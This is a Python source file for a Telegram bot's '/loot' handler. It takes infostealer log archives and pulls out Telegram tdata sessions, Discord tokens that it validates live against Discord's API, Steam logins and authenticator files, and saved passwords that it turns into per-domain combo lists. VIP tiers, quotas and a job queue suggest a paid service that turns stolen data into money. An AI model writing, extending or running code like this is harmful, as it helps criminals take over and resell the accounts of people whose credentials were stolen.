"""
``/loot`` conversation handler.

Companion to the existing ``/extract`` flow. Where ``/extract`` walks
an archive for browser cookies that match a target domain, ``/loot``
walks the same kind of archive for the *rest* of the stuff stealer
logs contain:

* Telegram Desktop ``tdata`` session folders (re-zipped per account)
* Discord auth tokens (live-validated against ``/users/@me``)
* Steam account logins, sentry files and Mobile Authenticator dumps
* Saved-password dumps (rendered as ULP + combo lists, with optional
  per-domain filtering)

The conversation is intentionally short:

  ``/loot``                          → "Send me an archive"
  ``/loot domain1.com, domain2.com`` → adds targeted combo lists

Heavy lifting (download, password prompts, archive extraction, scan,
validation, bundling) runs inside the shared :class:`JobQueue` worker
so /loot inherits the same VIP/admin priority + concurrency guarantees
as /extract.
"""

from __future__ import annotations

import asyncio
import os
import re
import tempfile
import time
from typing import Dict, List, Optional

from loguru import logger
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

import config
from db import database as db
from handlers.extract import (
    PASSWORD_CANCEL,
    _cancel_job_kb,
    _maybe_prompt_for_password,
    _notify_admin_error,
)
from services.downloader import download_file, download_from_url, send_result_file
from services.extractor import ExtractionProgress
from services.loot_extractor import (
    ALL_LOOT_BUCKETS,
    LOOT_ALL,
    LOOT_DISCORD,
    LOOT_PASSWORDS,
    LOOT_STEAM,
    LOOT_TDATA,
    LootExtractionConfig,
    run_loot_extraction_async,
)
from services.queue import JobQueue, QueueItem, priority_for
from utils.formatting import bytes_human, progress_bar, seconds_human
from utils.validators import validate_archive

# ── Conversation states ────────────────────────────────────
LOOT_TYPE, LOOT_FILE = range(2)

# Module-level job queue (initialised in :func:`register`)
_job_queue: JobQueue | None = None

# Active progress trackers per job — used by the dashboard updater and
# by /cancel_job_<id>.
_active_progress: Dict[int, ExtractionProgress] = {}

_URL_RE = re.compile(r"^\s*https?://\S+\s*$", re.IGNORECASE)
_DOMAIN_SPLIT_RE = re.compile(r"[\s,;]+")


# ── Small helpers (intentionally local — keeps loot orthogonal) ────


def _parse_domain_arg(text: str) -> List[str]:
    """Pull a comma/space-separated list of target domains out of the
    command tail. Returns a deduplicated, lowercased list."""
    if not text:
        return []
    out: List[str] = []
    seen: set[str] = set()
    for piece in _DOMAIN_SPLIT_RE.split(text.strip()):
        piece = piece.strip().lstrip(".").lower()
        if not piece or piece in seen:
            continue
        seen.add(piece)
        out.append(piece)
    return out[: config.MAX_DOMAINS_PER_EXTRACT]


def _loot_cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            "\u274c Cancel", callback_data="loot_cancel",
        )],
    ])


# Bucket buttons shown in the sub-picker. ``(callback_data, label)``
_LOOT_TYPE_BUTTONS = [
    (LOOT_ALL, "\U0001f4e6 All Loot"),
    (LOOT_TDATA, "\U0001f4f1 tdata (Telegram sessions)"),
    (LOOT_DISCORD, "\U0001f3ae Discord tokens"),
    (LOOT_STEAM, "\U0001f3ae Steam accounts"),
    (LOOT_PASSWORDS, "\U0001f511 Passwords (ULP / combos)"),
]


def _loot_type_kb() -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(label, callback_data=f"loot_pick:{cid}")]
        for cid, label in _LOOT_TYPE_BUTTONS
    ]
    rows.append([InlineKeyboardButton(
        "\u274c Cancel", callback_data="loot_cancel",
    )])
    return InlineKeyboardMarkup(rows)


def _buckets_from_pick(pick: str) -> frozenset[str]:
    """Translate a sub-picker callback value to the set of scanner
    bucket IDs the extractor should run."""
    if pick == LOOT_ALL or not pick:
        return frozenset()  # empty ⇒ all
    return frozenset({pick})


def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
    """Compact dashboard message for the loot worker. We don't try to
    show as many per-domain stats as ``_progress_updater`` in
    ``extract.py`` because loot has 4 separate buckets — terse beats
    pretty here."""
    phase = progress.phase
    cur_file = (progress.current_file or "…")
    if len(cur_file) > 40:
        cur_file = cur_file[:37] + "…"

    if phase == "downloading":
        pct = (
            progress.download_current
            / max(progress.download_total, 1) * 100
        )
        return (
            f"\U0001f4e6 Loot Job\n"
            f"\U0001f4e5 Downloading\n"
            f"   {progress_bar(progress.download_current, progress.download_total)} "
            f"{pct:.0f}%\n"
            f"   {bytes_human(progress.download_current)} / "
            f"{bytes_human(progress.download_total)}\n"
            f"\u23f1 Elapsed: {seconds_human(elapsed)}"
        )
    if phase == "extracting":
        if progress.extract_total > 0:
            pct = (
                progress.extract_current
                / max(progress.extract_total, 1) * 100
            )
            line = (
                f"   {progress_bar(progress.extract_current, progress.extract_total)} "
                f"{pct:.0f}% "
                f"({progress.extract_current:,}/{progress.extract_total:,})"
            )
        else:
            line = f"   Files extracted: {progress.extract_current:,}"
        return (
            f"\U0001f4e6 Loot Job\n"
            f"\U0001f4c2 Extracting archive\n"
            f"{line}\n"
            f"   Now: {cur_file}\n"
            f"\u23f1 Elapsed: {seconds_human(elapsed)}"
        )
    if phase == "scanning":
        return (
            f"\U0001f4e6 Loot Job\n"
            f"\U0001f50d Scanning for tdata / Discord / Steam / creds\n"
            f"   Now: {cur_file}\n"
            f"\u23f1 Elapsed: {seconds_human(elapsed)}"
        )
    if phase == "packaging":
        return (
            f"\U0001f4e6 Loot Job\n"
            f"\U0001f4be Packaging loot_results.zip…\n"
            f"\u23f1 Elapsed: {seconds_human(elapsed)}"
        )
    if phase == "done":
        return "\u2705 Loot scan finished — sending file…"
    return f"\U0001f4e6 Loot Job — phase: {phase}"


async def _loot_progress_updater(
    msg, job_id: int, progress: ExtractionProgress,
) -> None:
    start = time.monotonic()
    last_text = ""
    while True:
        await asyncio.sleep(config.PROGRESS_UPDATE_INTERVAL)
        elapsed = time.monotonic() - start
        try:
            if progress.phase == "awaiting_password":
                continue
            if progress.phase == "downloading" and progress.live_download_msg:
                continue
            text = _loot_progress_text(progress, elapsed)
            if text == last_text:
                continue
            try:
                await msg.edit_text(text, reply_markup=_cancel_job_kb(job_id))
                last_text = text
            except Exception:
                # Ignore "Message is not modified" + transient TG errors.
                pass
            if progress.phase in ("done", "failed", "cancelled"):
                return
        except asyncio.CancelledError:
            return
        except Exception:
            logger.exception("loot progress updater crashed (job={})", job_id)
            return


def _summary_caption(lr) -> str:
    """One-liner shipped as the caption of ``loot_results.zip``. Lists
    the four buckets the user is most likely to care about."""
    valid_tdata = sum(1 for a in lr.tdata if a.valid)
    live_disc = sum(1 for t in lr.discord if t.valid is True)
    live_steam = sum(1 for a in lr.steam if a.valid is True)
    creds = len(lr.credentials)
    lines = ["\U0001f4e6 Loot summary"]
    if lr.tdata:
        lines.append(f"   tdata: {len(lr.tdata)} ({valid_tdata} valid)")
    if lr.discord:
        lines.append(f"   discord: {len(lr.discord)} ({live_disc} live)")
    if lr.steam:
        lines.append(f"   steam: {len(lr.steam)} ({live_steam} live)")
    if creds:
        lines.append(f"   credentials: {creds}")
    if not (lr.tdata or lr.discord or lr.steam or lr.credentials):
        lines.append("   (no loot found in this archive)")
    return "\n".join(lines)


# ── Conversation states ────────────────────────────────────


async def loot_entry(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Entry point for ``/loot`` and the inline Loot button."""
    user = update.effective_user
    if user is None:
        return ConversationHandler.END

    row = await db.ensure_user(user.id, user.username, user.first_name)
    if row["is_banned"]:
        reason = row["ban_reason"] or "N/A"
        await update.effective_message.reply_text(
            f"\U0001f6ab You are banned.\nReason: {reason}",
        )
        return ConversationHandler.END

    if (
        await db.get_setting("maintenance") == "1"
        and user.id != config.ADMIN_ID
    ):
        await update.effective_message.reply_text(
            "\U0001f527 Bot is under maintenance. Please check back later.",
        )
        return ConversationHandler.END

    is_admin = user.id == config.ADMIN_ID
    count = await db.count_user_extractions_last_hour(user.id)
    if count >= config.MAX_EXTRACTIONS_PER_HOUR and not is_admin:
        await update.effective_message.reply_text(
            f"\u26a0\ufe0f Rate limit reached "
            f"({config.MAX_EXTRACTIONS_PER_HOUR}/hour).\n"
            "Please wait before starting another job.",
        )
        return ConversationHandler.END

    # Optional domain list from the command tail
    raw_args = ""
    if update.message and update.message.text:
        parts = update.message.text.split(None, 1)
        raw_args = parts[1] if len(parts) > 1 else ""
    target_domains = _parse_domain_arg(raw_args)
    context.user_data["loot_targets"] = target_domains  # type: ignore[index]

    text = (
        "\U0001f4e6 <b>Loot scan</b>\n\n"
        "What do you want to extract?\n"
        "Pick a category below, then send me the archive."
    )
    if target_domains:
        text += (
            "\n\nTargeted combos: "
            + ", ".join(f"<code>{d}</code>" for d in target_domains)
        )
    msg = update.effective_message
    if update.callback_query:
        await update.callback_query.answer()
        try:
            await update.callback_query.edit_message_text(
                text, reply_markup=_loot_type_kb(), parse_mode="HTML",
            )
        except Exception:
            await msg.reply_text(
                text, reply_markup=_loot_type_kb(), parse_mode="HTML",
            )
    else:
        await msg.reply_text(
            text, reply_markup=_loot_type_kb(), parse_mode="HTML",
        )
    return LOOT_TYPE


async def loot_type_picked(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
) -> int:
    """User tapped one of the loot-type buttons → store the bucket
    selection and move to the FILE state."""
    q = update.callback_query
    if q is None or q.data is None:
        return LOOT_TYPE
    await q.answer()
    pick = q.data.split(":", 1)[1] if ":" in q.data else ""
    buckets = _buckets_from_pick(pick)
    context.user_data["loot_buckets"] = buckets  # type: ignore[index]

    # Label for the status line
    label_map = {b: lbl for b, lbl in _LOOT_TYPE_BUTTONS}
    label = label_map.get(pick, "All Loot")

    target_domains: List[str] = context.user_data.get(  # type: ignore[union-attr]
        "loot_targets", [],
    )
    extras: List[str] = []
    if target_domains:
        extras.append(
            "Targeted combos: "
            + ", ".join(target_domains)
        )
    extras.append(
        f"Validation: {'ON' if config.LOOT_VALIDATE else 'OFF'}"
    )

    text = (
        f"\U0001f4e6 <b>{label}</b>\n\n"
        "Send an archive (zip / rar / 7z / tar.gz) or paste a "
        "direct download URL.\n\n"
        + "\n".join(extras)
    )
    try:
        await q.edit_message_text(
            text, reply_markup=_loot_cancel_kb(), parse_mode="HTML",
        )
    except Exception:
        await update.effective_message.reply_text(
            text, reply_markup=_loot_cancel_kb(), parse_mode="HTML",
        )
    return LOOT_FILE


async def loot_file_received(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
) -> int:
    """Accept either a Telegram document upload or a direct URL."""
    user = update.effective_user
    if user is None or update.message is None:
        return ConversationHandler.END

    target_domains: List[str] = context.user_data.get(  # type: ignore[union-attr]
        "loot_targets", [],
    )
    buckets: frozenset[str] = context.user_data.get(  # type: ignore[union-attr]
        "loot_buckets", frozenset(),
    )

    # ── Case A: direct URL ──
    raw_text = (update.message.text or "").strip()
    if raw_text and _URL_RE.match(raw_text):
        return await _enqueue_loot_job(
            update, context, user.id,
            source=("url", raw_text, _name_from_url(raw_text)),
            file_name=_name_from_url(raw_text),
            file_size=0,
            target_domains=target_domains,
            buckets=buckets,
        )

    # ── Case B: archive document ──
    doc = update.message.document
    if doc is None:
        await update.message.reply_text(
            "\u274c Please send an archive file or paste a "
            "direct http(s) URL.",
            reply_markup=_loot_cancel_kb(),
        )
        return LOOT_FILE

    valid, ext_or_err = validate_archive(doc.file_name, doc.mime_type)
    if not valid:
        await update.message.reply_text(
            f"\u274c {ext_or_err}", reply_markup=_loot_cancel_kb(),
        )
        return LOOT_FILE

    file_size = doc.file_size or 0
    is_admin = user.id == config.ADMIN_ID
    vip = await db.is_vip(user.id)
    if not is_admin:
        max_bytes = (
            config.VIP_MAX_FILE_BYTES if vip else config.FREE_MAX_FILE_BYTES
        )
        if file_size > max_bytes:
            await update.message.reply_text(
                f"\u274c File too large ({bytes_human(file_size)}).\n"
                f"Max: {bytes_human(max_bytes)}",
                reply_markup=_loot_cancel_kb(),
            )
            return LOOT_FILE

    if not is_admin:
        remaining = await db.get_remaining_quota(user.id)
        if remaining != -1 and file_size > remaining:
            await update.message.reply_text(
                f"\u274c Daily quota exceeded "
                f"({bytes_human(file_size)} > "
                f"{bytes_human(remaining)} remaining).",
                reply_markup=_loot_cancel_kb(),
            )
            return ConversationHandler.END
        await db.consume_quota(user.id, file_size)

    return await _enqueue_loot_job(
        update, context, user.id,
        source=update.message,
        file_name=doc.file_name or "archive",
        file_size=file_size,
        target_domains=target_domains,
        buckets=buckets,
    )


def _name_from_url(url: str) -> str:
    """Best-effort filename from a URL path. Falls back to ``archive.zip``."""
    try:
        from urllib.parse import urlparse, unquote

        path = urlparse(url).path
        name = os.path.basename(unquote(path or ""))
        if not name:
            return "archive.zip"
        return name
    except Exception:
        return "archive.zip"


async def _enqueue_loot_job(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    user_id: int,
    *,
    source,
    file_name: str,
    file_size: int,
    target_domains: List[str],
    buckets: frozenset[str] = frozenset(),
) -> int:
    """Create a DB job, build the worker coro, enqueue on the shared
    JobQueue. Returns ConversationHandler.END so caller can return it
    directly."""
    domain_label = (
        f"loot:{','.join(target_domains)}" if target_domains else "loot"
    )
    job_id = await db.create_job(
        user_id, domain_label, file_name, file_size,
    )
    progress_msg = await update.message.reply_text(  # type: ignore[union-attr]
        "\u23f3 Loot job queued…",
        reply_markup=_cancel_job_kb(job_id),
    )

    progress = ExtractionProgress()
    _active_progress[job_id] = progress

    async def _worker() -> None:
        await _process_loot_job(
            update, context, job_id, user_id, source,
            progress_msg, progress, target_domains,
            buckets=buckets,
        )

    is_admin = user_id == config.ADMIN_ID
    is_vip_flag = await db.is_vip(user_id)
    item = QueueItem(
        priority=priority_for(is_admin, is_vip_flag),
        job_id=job_id,
        user_id=user_id,
        is_vip=is_vip_flag,
        coro_factory=_worker,
    )
    assert _job_queue is not None
    pos = await _job_queue.enqueue(item)
    if pos > 0:
        await progress_msg.edit_text(
            f"\u23f3 Loot job — you are #{pos + 1} in queue.\n"
            f"Estimated wait: ~{pos * 4} minutes",
            reply_markup=_cancel_job_kb(job_id),
        )
    return ConversationHandler.END


async def _process_loot_job(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    job_id: int,
    user_id: int,
    source,
    progress_msg,
    progress: ExtractionProgress,
    target_domains: List[str],
    *,
    buckets: frozenset[str] = frozenset(),
) -> None:
    """Queue-worker body: download → maybe-prompt-password → run loot
    extractor → ship the resulting zip."""
    start_ts = time.monotonic()
    temp_dir = tempfile.mkdtemp(dir=str(config.TEMP_DIR), prefix="loot_dl_")
    archive_path: Optional[str] = None
    er = None
    lr = None
    try:
        await db.update_job(job_id, status="processing", started_at=db._now())
        updater_task = asyncio.create_task(
            _loot_progress_updater(progress_msg, job_id, progress),
        )

        # Acquire the archive.
        if (
            isinstance(source, tuple)
            and source and source[0] == "url"
        ):
            _, url_value, name_hint = source
            archive_path = await download_from_url(
                url_value,
                temp_dir,
                progress,
                file_name_hint=name_hint,
                status_msg=progress_msg,
                cancel_kb=_cancel_job_kb(job_id),
            )
        else:
            archive_path = await download_file(
                source,
                temp_dir,
                progress,
                status_msg=progress_msg,
                cancel_kb=_cancel_job_kb(job_id),
            )

        password = await _maybe_prompt_for_password(
            context, user_id, archive_path, progress_msg, job_id, progress,
        )
        if password is PASSWORD_CANCEL:
            if not updater_task.done():
                updater_task.cancel()
                try:
                    await updater_task
                except asyncio.CancelledError:
                    pass
            duration = time.monotonic() - start_ts
            await db.update_job(
                job_id,
                status="cancelled",
                error_message="Cancelled \u2014 password not provided",
                completed_at=db._now(),
                duration_seconds=duration,
            )
            return

        settings = LootExtractionConfig(
            target_domains=target_domains,
            validate=config.LOOT_VALIDATE,
            buckets=buckets,
        )
        er, lr = await run_loot_extraction_async(
            archive_path, progress, settings, password=password,
        )

        if not updater_task.done():
            updater_task.cancel()
            try:
                await updater_task
            except asyncio.CancelledError:
                pass

        if not er.success and not er.output_files:
            duration = time.monotonic() - start_ts
            await db.update_job(
                job_id,
                status="cancelled" if er.partial else "failed",
                error_message=er.error,
                completed_at=db._now(),
                duration_seconds=duration,
            )
            await progress_msg.edit_text(
                ("\u26a0\ufe0f Cancelled: " if er.partial else
                 "\u274c Loot extraction failed: ")
                + (er.error or "unknown error"),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(
                        "\U0001f4e6 Try Loot Again", callback_data="loot",
                    ),
                     InlineKeyboardButton(
                        "\U0001f3e0 Home", callback_data="home",
                    )],
                ]),
            )
            if not er.partial:
                _notify_admin_error(
                    context, user_id, "loot extraction", er.error,
                )
            return

        duration = time.monotonic() - start_ts
        await db.update_job(
            job_id,
            status="cancelled" if er.partial else "done",
            cookies_found=0,
            files_scanned=er.files_scanned,
            completed_at=db._now(),
            duration_seconds=duration,
            error_message=(
                "Cancelled \u2014 partial results" if er.partial else None
            ),
        )
        job_row = await db.get_job(job_id)
        archive_size = (
            job_row["file_size_bytes"] if job_row else 0  # type: ignore[index]
        )
        await db.increment_user_stats(user_id, 0, archive_size)

        caption = _summary_caption(lr)
        try:
            await progress_msg.edit_text(
                "\U0001f4e4 Uploading results…",
                reply_markup=_cancel_job_kb(job_id),
            )
        except Exception:
            pass
        for fpath in er.output_files:
            ok = await send_result_file(
                context,
                user_id,
                fpath,
                caption=caption,
                status_msg=progress_msg,
            )
            if ok:
                caption = None  # only caption the first file

        # Final status line in chat — replace the live dashboard.
        try:
            await progress_msg.edit_text(
                _summary_caption(lr) + "\n\n\u2705 Done.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(
                        "\U0001f4e6 New Loot Scan", callback_data="loot",
                    ),
                     InlineKeyboardButton(
                        "\U0001f3e0 Home", callback_data="home",
                    )],
                ]),
            )
        except Exception:
            pass
    except Exception as exc:
        logger.exception("loot job crashed (job={})", job_id)
        try:
            await db.update_job(
                job_id,
                status="failed",
                error_message=str(exc),
                completed_at=db._now(),
                duration_seconds=time.monotonic() - start_ts,
            )
        except Exception:
            pass
        try:
            await progress_msg.edit_text(
                f"\u274c Loot job crashed: {exc}",
            )
        except Exception:
            pass
        _notify_admin_error(context, user_id, "loot job", str(exc))
    finally:
        # Clean the per-job download dir + the output dir (if any).
        try:
            import shutil

            shutil.rmtree(temp_dir, ignore_errors=True)
            if er and er.output_files:
                out_dir = os.path.dirname(er.output_files[0])
                if out_dir and out_dir.startswith(str(config.TEMP_DIR)):
                    shutil.rmtree(out_dir, ignore_errors=True)
        except Exception:
            pass
        _active_progress.pop(job_id, None)


async def cancel_loot(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
) -> int:
    if update.callback_query:
        await update.callback_query.answer()
        try:
            await update.callback_query.edit_message_text(
                "\u274c Loot cancelled.",
            )
        except Exception:
            pass
    elif update.message:
        await update.message.reply_text("\u274c Loot cancelled.")
    context.user_data.pop("loot_targets", None)  # type: ignore[union-attr]
    return ConversationHandler.END


# ── Public hook ────────────────────────────────────────────


def register(app, job_queue: JobQueue) -> None:
    """Wire the /loot conversation into the application."""
    global _job_queue
    _job_queue = job_queue

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("loot", loot_entry),
            CallbackQueryHandler(loot_entry, pattern="^loot$"),
        ],
        states={
            LOOT_TYPE: [
                CallbackQueryHandler(
                    loot_type_picked, pattern=r"^loot_pick:",
                ),
                CallbackQueryHandler(cancel_loot, pattern="^loot_cancel$"),
            ],
            LOOT_FILE: [
                MessageHandler(filters.Document.ALL, loot_file_received),
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND & filters.Regex(
                        r"^\s*https?://\S+\s*$",
                    ),
                    loot_file_received,
                ),
                CallbackQueryHandler(cancel_loot, pattern="^loot_cancel$"),
            ],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_loot, pattern="^loot_cancel$"),
            CommandHandler("cancel", cancel_loot),
        ],
        per_message=False,
    )
    app.add_handler(conv)
